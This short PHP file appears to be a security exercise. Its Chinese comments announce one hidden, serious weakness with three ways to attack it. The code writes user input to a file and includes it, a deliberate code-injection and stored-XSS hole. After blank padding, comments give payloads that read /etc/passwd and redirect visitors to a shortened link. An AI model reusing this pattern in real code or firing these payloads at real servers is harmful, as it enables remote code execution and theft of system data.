<?php
// 這個程式存在了1個嚴重的弱點，很容易被忽略
// 有3種不同的方式可以發動攻擊
if($_REQUEST['content']){
  $content = urldecode($_REQUEST['content']);
  file_put_contents('./saved.html', $content);
}
if(file_exists('saved.html')){
  ob_start();
  include_once('./saved.html');
  ob_get_contents();
}














// %3C%3Fphp%20echo%20file_get_contents(%27%2Fetc%2Fpasswd%27)%3B%20%3F%3E
// <script>location = 'http://goo.gl/fl8KY1';</script>
